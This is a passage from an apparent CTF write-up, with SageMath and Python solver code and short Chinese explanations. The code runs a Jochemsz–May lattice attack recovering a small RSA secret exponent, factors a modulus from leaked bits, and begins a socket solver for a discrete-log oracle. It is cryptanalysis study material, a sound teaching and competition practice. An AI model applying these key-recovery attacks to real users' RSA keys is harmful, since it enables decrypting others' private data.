class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%03d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">print</span> (a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_monomials</span>(<span class="params">monomials</span>):</span></span><br><span class="line">    <span class="comment"># 直接用 sorted() 方法也是可以的</span></span><br><span class="line">    x, y, z = monomials[<span class="number">0</span>].parent().gens()</span><br><span class="line">    Mx = []</span><br><span class="line">    My = []</span><br><span class="line">    Mz = []</span><br><span class="line">    degx = max([monomial.degree(x) <span class="keyword">for</span> monomial <span class="keyword">in</span></span><br><span class="line">monomials])</span><br><span class="line">    degy = max([monomial.degree(y) <span class="keyword">for</span> monomial <span class="keyword">in</span></span><br><span class="line">monomials])</span><br><span class="line">    degz = max([monomial.degree(z) <span class="keyword">for</span> monomial <span class="keyword">in</span></span><br><span class="line">monomials])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(degx + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(degy + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(degz + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> k+j &gt; i:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials:</span><br><span class="line">                    Mx += [mono]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(degy + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(degz + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(degx + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> k &gt; j:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials <span class="keyword">and</span> mono <span class="keyword">not</span> <span class="keyword">in</span> Mx:</span><br><span class="line">                    My += [mono]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(degz + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(degy + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(degx + <span class="number">1</span>):</span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials <span class="keyword">and</span> mono <span class="keyword">not</span> <span class="keyword">in</span> (Mx+My):</span><br><span class="line">                    Mz += [mono]</span><br><span class="line">    <span class="keyword">return</span> Mx + My + Mz</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jochemsz_may_trivariate</span>(<span class="params">pol, XX, YY, ZZ, WW, tau, mm</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   Implementation of Finding roots of trivariate</span></span><br><span class="line"><span class="string">polynomial [1].</span></span><br><span class="line"><span class="string">   Thanks @Bono_iPad</span></span><br><span class="line"><span class="string">   References:</span></span><br><span class="line"><span class="string">       [1] Ellen Jochemsz and Alexander May. &quot;A Strategy</span></span><br><span class="line"><span class="string">for Finding Roots of Multivariate Polynomials with New</span></span><br><span class="line"><span class="string">Applications in Attacking RSA Variants&quot;</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">    tt = floor(mm * tau)</span><br><span class="line">    cond = XX^(<span class="number">7</span> + <span class="number">9</span>*tau + <span class="number">3</span>*tau^<span class="number">2</span>) * (YY*ZZ)^(<span class="number">5</span>+<span class="number">9</span>/<span class="number">2</span>*tau)&lt; WW^(<span class="number">3</span> + <span class="number">3</span>*tau)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&#x27;[+] Bound check: X^&#123;7+9tau+3tau^2&#125; *(YZ)^&#123;5+9/2tau&#125; &lt; W^&#123;3+3tau&#125;:&#x27;</span>, )</span><br><span class="line">    <span class="keyword">if</span> cond:</span><br><span class="line">        print( <span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;NG&#x27;</span>)</span><br><span class="line">    <span class="comment"># Polynomial constant coefficient (a_0) must be 1</span></span><br><span class="line">    <span class="comment"># <span class="doctag">XXX:</span> can a_0 be zero?</span></span><br><span class="line">    f_ = pol</span><br><span class="line">    a0 = f_.constant_coefficient()</span><br><span class="line">    <span class="keyword">while</span> gcd(a0, XX) != <span class="number">1</span>:</span><br><span class="line">        XX += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, YY) != <span class="number">1</span>:</span><br><span class="line">        YY += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, ZZ) != <span class="number">1</span>:</span><br><span class="line">        ZZ += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, WW) != <span class="number">1</span>:</span><br><span class="line">        WW += <span class="number">1</span></span><br><span class="line">    RR = WW * XX^(<span class="number">2</span>*(mm<span class="number">-1</span>)+tt) * (YY*ZZ)^(mm<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">if</span> a0 != <span class="number">0</span>:</span><br><span class="line">        F = Zmod(RR)</span><br><span class="line">        PK = PolynomialRing(F, <span class="string">&#x27;xs, ys, zs&#x27;</span>)</span><br><span class="line">        f_ = PR(PK(f_) * F(a0)^<span class="number">-1</span>)</span><br><span class="line">    <span class="comment"># Construct set `S` (cf.[1] p.8)</span></span><br><span class="line">    S = set()</span><br><span class="line">    <span class="keyword">for</span> i2, i3 <span class="keyword">in</span> itertools.product(range(<span class="number">0</span>, mm),</span><br><span class="line">repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">2</span>*(mm<span class="number">-1</span>) - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">            S.add(x^i1 * y^i2 * z^i3)</span><br><span class="line">    m_S = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(mm):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(mm):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>*(mm<span class="number">-1</span>) - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">                m_S += [x^i*y^j*z^k]</span><br><span class="line">    S = m_S</span><br><span class="line">    <span class="comment"># Construct set `M` (cf.[1] p.8)</span></span><br><span class="line">    M = set()</span><br><span class="line">    <span class="keyword">for</span> i2, i3 <span class="keyword">in</span> itertools.product(range(<span class="number">0</span>, mm + <span class="number">1</span>),</span><br><span class="line">repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">2</span>*mm - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">            M.add(x^i1 * y^i2 * z^i3)</span><br><span class="line">    M_S = list(M - set(S))</span><br><span class="line">    m_M_S = []</span><br><span class="line">    deg_x = max([mono.degree(x) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    deg_y = max([mono.degree(y) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    deg_z = max([mono.degree(z) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(deg_z + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(deg_y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(deg_x + <span class="number">1</span>):</span><br><span class="line">                mono = x^i*y^j*z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> M_S:</span><br><span class="line">                    m_M_S += [mono]</span><br><span class="line">    M_S = m_M_S</span><br><span class="line">    <span class="comment"># Construct polynomial `g`, `g&#x27;` for basis of lattice</span></span><br><span class="line">    g = []</span><br><span class="line">    g_ = []</span><br><span class="line">    M_S = sort_monomials(M_S)</span><br><span class="line">    S = sort_monomials(S)</span><br><span class="line">    <span class="keyword">for</span> monomial <span class="keyword">in</span> S:</span><br><span class="line">        i1 = monomial.degree(x)</span><br><span class="line">        i2 = monomial.degree(y)</span><br><span class="line">        i3 = monomial.degree(z)</span><br><span class="line">        g += [monomial * f_ * XX^(<span class="number">2</span>*(mm<span class="number">-1</span>)+tt-i1) *</span><br><span class="line">YY^(mm<span class="number">-1</span>-i2) * ZZ^(mm<span class="number">-1</span>-i3)]</span><br><span class="line">    <span class="keyword">for</span> monomial <span class="keyword">in</span> M_S:</span><br><span class="line">        g_ += [monomial * RR]</span><br><span class="line">    <span class="comment"># Construct Lattice from `g`, `g&#x27;`</span></span><br><span class="line">    monomials_G = []</span><br><span class="line">    monomials = []</span><br><span class="line">    G = g + g_</span><br><span class="line">    deg_x = deg_y = deg_z = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> g_poly <span class="keyword">in</span> G:</span><br><span class="line">        monomials_G += g_poly.monomials()</span><br><span class="line">        deg_x = max(deg_x, g_poly.degree(x))</span><br><span class="line">        deg_y = max(deg_y, g_poly.degree(y))</span><br><span class="line">        deg_z = max(deg_z, g_poly.degree(z))</span><br><span class="line">    monomials_G = sorted(set(monomials_G))</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(deg_z + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(deg_y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(deg_x + <span class="number">1</span>):</span><br><span class="line">                mono = x^i*y^j*z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials_G:</span><br><span class="line">                    monomials += [x^i*y^j*z^k]</span><br><span class="line">    <span class="keyword">assert</span> len(monomials) == len(G)</span><br><span class="line">    monomials = sort_monomials(monomials)</span><br><span class="line">    dims = len(monomials)</span><br><span class="line">    M = Matrix(IntegerRing(), dims)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dims):</span><br><span class="line">        M[i, <span class="number">0</span>] = G[i](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(dims):</span><br><span class="line">            <span class="keyword">if</span> monomials[j] <span class="keyword">in</span> G[i].monomials():</span><br><span class="line">                M[i, j] = G[i].monomial_coefficient(monomials[j]) * monomials[j](XX,YY, ZZ)</span><br><span class="line">    matrix_overview(M)</span><br><span class="line">    <span class="keyword">print</span> ()</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&#x27;=&#x27;</span> * <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">print</span> ()</span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    start = time()</span><br><span class="line">    B = M.LLL()</span><br><span class="line">    matrix_overview(B)</span><br><span class="line">    print(<span class="string">&#x27;[+] LLL cost %d sec&#x27;</span> % (time() - start))</span><br><span class="line">    <span class="comment"># Re-construct polynomial `H_i` from Reduced-lattice</span></span><br><span class="line">    H = [(i, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(dims)]</span><br><span class="line">    H = dict(H)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dims):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(dims):</span><br><span class="line">            H[i] += PR((monomials[j] * B[i, j]) /monomials[j](XX, YY, ZZ))</span><br><span class="line">    PX = PolynomialRing(IntegerRing(), <span class="string">&#x27;xn&#x27;</span>)</span><br><span class="line">    xn = PX.gen()</span><br><span class="line">    PY = PolynomialRing(IntegerRing(), <span class="string">&#x27;yn&#x27;</span>)</span><br><span class="line">    yn = PX.gen()</span><br><span class="line">    PZ = PolynomialRing(IntegerRing(), <span class="string">&#x27;zn&#x27;</span>)</span><br><span class="line">    zn = PX.gen()</span><br><span class="line">    <span class="comment"># Solve for `x`</span></span><br><span class="line">    r1 = H[<span class="number">2</span>].resultant(pol, y)</span><br><span class="line">    r2 = H[<span class="number">3</span>].resultant(pol, y)</span><br><span class="line">    r3 = r1.resultant(r2, z)</span><br><span class="line">    x_roots = map(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], r3.subs(x=xn).roots())</span><br><span class="line">    x_roots = list(x_roots)</span><br><span class="line">    <span class="keyword">assert</span> len(x_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> len(x_roots) == <span class="number">1</span> <span class="keyword">and</span> x_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for`x`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    x_root = x_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&#x27;[+] Found x0 = %d&#x27;</span> % x_root)</span><br><span class="line">    <span class="comment"># Solve for `z`</span></span><br><span class="line">    r1_ = r1.subs(x=x_root)</span><br><span class="line">    r2_ = r2.subs(x=x_root)</span><br><span class="line">    z_roots = map(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], gcd(r1_,r2_).subs(z=zn).roots())</span><br><span class="line">    z_roots = list(z_roots)</span><br><span class="line">    <span class="keyword">assert</span> len(z_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> len(z_roots) == <span class="number">1</span> <span class="keyword">and</span> z_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for`z`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    z_root = z_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&#x27;[+] Found z0 = %d&#x27;</span> % z_root)</span><br><span class="line">    <span class="comment"># Solve for `y`</span></span><br><span class="line">    y_roots = map(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], H[<span class="number">2</span>].subs(x=x_root,z=z_root).subs(y=yn).roots())</span><br><span class="line">    y_roots = list(y_roots)</span><br><span class="line">    <span class="keyword">assert</span> len(y_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> len(y_roots) == <span class="number">1</span> <span class="keyword">and</span> y_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for`y`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    y_root = y_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&#x27;[+] Found y0 = %d&#x27;</span> % y_root)</span><br><span class="line">    <span class="keyword">assert</span> pol(x_root, y_root, z_root) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> (x_root, y_root, z_root)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="comment"># Sample Implementation: small secret exponents attack for Common Prime RSA proposed at [1]</span></span><br><span class="line"></span><br><span class="line">    n = <span class="number">253784908428481171520644795825628119823506176672683456544539675613895749357067944465796492899363087465652749951069021248729871498716450122759675266109104893465718371075137027806815473672093804600537277140261127375373193053173163711234309619016940818893190549811778822641165586070952778825226669497115448984409</span></span><br><span class="line">    e = <span class="number">31406775715899560162787869974700016947595840438708247549520794775013609818293759112173738791912355029131497095419469938722402909767606953171285102663874040755958087885460234337741136082351825063419747360169129165</span></span><br><span class="line">    c = <span class="number">97724073843199563126299138557100062208119309614175354104566795999878855851589393774478499956448658027850289531621583268783154684298592331328032682316868391120285515076911892737051842116394165423670275422243894220422196193336551382986699759756232962573336291032572968060586136317901595414796229127047082707519</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gamma = 0.4</span></span><br><span class="line">    <span class="comment"># delta = 0.1604</span></span><br><span class="line">    gamma = <span class="number">1</span> - <span class="number">703</span>/<span class="number">1026</span></span><br><span class="line">    delta = <span class="number">135</span>/<span class="number">1026</span></span><br><span class="line">    PR.&lt;x, y, z&gt; = PolynomialRing(ZZ)</span><br><span class="line">    x, y, z = PR.gens()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Maximal value of solution `x0`, `y0`, `z0`</span></span><br><span class="line">    XX = floor(n^delta)</span><br><span class="line">    YY = floor(n^(delta + <span class="number">0.5</span> - gamma))</span><br><span class="line">    ZZ = YY</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Norm of polynomial as vector representation</span></span><br><span class="line">    WW = floor(n^(<span class="number">2</span> + <span class="number">2</span>*delta - <span class="number">2</span>*gamma))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Some Non-negative real (cf. [1] p.13)</span></span><br><span class="line">    tau = (<span class="number">1</span>/<span class="number">2</span> + gamma - <span class="number">4</span>*delta) / (<span class="number">2</span>*delta)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Powering degree</span></span><br><span class="line">    mm = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Target polynomial</span></span><br><span class="line">    pol = e^<span class="number">2</span> * x^<span class="number">2</span> + e*x*(y+z<span class="number">-2</span>)-(y+z<span class="number">-1</span>)-(n<span class="number">-1</span>)*y*z</span><br><span class="line">    x0, y0, z0 = jochemsz_may_trivariate(pol, XX, YY, ZZ, WW, tau, mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># `x0` is secret exponents. so, `e` * `x0` equivalent to 1 modulo `\phi(n)`.</span></span><br><span class="line">    <span class="keyword">assert</span> (Mod(<span class="number">0xdeadbeefcafebabe</span>, n)^e)^x0 == <span class="number">0xdeadbeefcafebabe</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[+] d = %d&#x27;</span> % x0)</span><br></pre></td></tr></table></figure><h2 id="leak-rsa"><a href="#leak-rsa" class="headerlink" title="leak_rsa"></a>leak_rsa</h2><p>先在$(1,e)$ 范围内爆破<code>k</code>，主要利用</p><script type="math/tex; mode=display">d(k) = \lfloor \frac{k(N+1)+1}{e} \rfloor</script><p>比较hint3较前的比特。求得<code>k = 1972411342</code></p><p>而后利用</p><script type="math/tex; mode=display">ed = k(p-1)*(q-1)+1 \\p*q=n</script><p>不断剪枝即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">factors = [[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">510</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    factors_temp = []</span><br><span class="line">    <span class="keyword">if</span> hint1.get(i):</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(len(factors)):</span><br><span class="line">            factors_temp.append([hint1.get(i) + factors[index][<span class="number">0</span>], factors[index][<span class="number">1</span>], factors[index][<span class="number">2</span>]])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(len(factors)):</span><br><span class="line">            factors_temp.append([<span class="string">&#x27;0&#x27;</span> + factors[index][<span class="number">0</span>], factors[index][<span class="number">1</span>], factors[index][<span class="number">2</span>]])</span><br><span class="line">            factors_temp.append([<span class="string">&#x27;1&#x27;</span> + factors[index][<span class="number">0</span>], factors[index][<span class="number">1</span>], factors[index][<span class="number">2</span>]])</span><br><span class="line">    <span class="keyword">if</span> hint2.get(i):</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(len(factors_temp)):</span><br><span class="line">            factors_temp[index][<span class="number">1</span>] = hint2.get(i) + factors_temp[index][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(len(factors_temp)):</span><br><span class="line">            factors_temp.append([factors_temp[index][<span class="number">0</span>], <span class="string">&#x27;1&#x27;</span> + factors_temp[index][<span class="number">1</span>], factors_temp[index][<span class="number">2</span>]])</span><br><span class="line">            factors_temp[index][<span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span> + factors_temp[index][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> hint3.get(<span class="number">512</span> + i):</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(len(factors_temp)):</span><br><span class="line">            factors_temp[index][<span class="number">2</span>] = hint3.get(<span class="number">512</span> + i) + factors_temp[index][<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> range(len(factors_temp)):</span><br><span class="line">            factors_temp.append([factors_temp[index][<span class="number">0</span>], factors_temp[index][<span class="number">1</span>], <span class="string">&#x27;1&#x27;</span> + factors_temp[index][<span class="number">2</span>]])</span><br><span class="line">            factors_temp[index][<span class="number">2</span>] = <span class="string">&#x27;0&#x27;</span> + factors_temp[index][<span class="number">2</span>]</span><br><span class="line">    factors = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(factors_temp)):</span><br><span class="line">        p_ = int(factors_temp[j][<span class="number">0</span>], <span class="number">2</span>)</span><br><span class="line">        q_ = int(factors_temp[j][<span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line">        d_ = int(factors_temp[j][<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        mod = <span class="number">2</span> ** (<span class="number">512</span> - i)</span><br><span class="line">        <span class="keyword">if</span> (p_ * q_ - n) % mod == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> (e * d_ - <span class="number">1</span> - k * (p_ - <span class="number">1</span>) * (q_ - <span class="number">1</span>)) % mod == <span class="number">0</span>:</span><br><span class="line">                factors.append(factors_temp[j])</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> factors:</span><br><span class="line">    <span class="keyword">if</span> n % int(fac[<span class="number">0</span>], <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">        p = int(fac[<span class="number">0</span>], <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure><h2 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a>DLP</h2><p>令$S_{i+1} = 2<em>S_{i}+1$,如果返回的$r=1$，则$S_{i+1}$猜测正确，如果$r=0$，则$S_{i+1} = 2</em>S_{i}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.sendall(msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_line</span>():</span></span><br><span class="line">    body = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ch = s.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> ch == <span 